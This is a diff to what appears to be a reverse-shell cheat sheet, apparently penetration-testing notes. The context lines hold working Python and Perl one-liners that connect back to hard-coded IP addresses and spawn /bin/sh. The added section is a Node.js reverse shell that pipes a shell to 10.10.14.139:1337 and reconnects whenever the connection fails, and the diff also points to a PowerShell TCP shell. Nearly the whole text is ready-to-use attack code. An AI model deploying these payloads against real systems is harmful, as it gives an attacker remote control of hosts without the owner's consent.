@@ -38,7 +38,7 @@
 
      python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-     
+
 
 # Perl
     perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -136,6 +136,36 @@ BEGIN {
         }
 }
 ````
+
+
+# JS shell
+```
+var net = require('net');
+var spawn = require('child_process').spawn;
+HOST="10.10.14.139";
+PORT="1337";
+TIMEOUT="5000";
+if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
+function c(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+        var sh = spawn('/bin/sh',[]);
+        client.write("Connected!\n");
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+        sh.on('exit',function(code,signal){
+          client.end("Disconnected!\n");
+        });
+    });
+    client.on('error', function(e) {
+        setTimeout(c(HOST,PORT), TIMEOUT);
+    });
+}
+c(HOST,PORT);
+```
+
+
 # PowerShell - Nishang Invoke-PowerShellTcp.ps1
 Nishang Powershell - Invoke-PowerShellTcp.ps1
 - https://github.com/samratashok/nishang
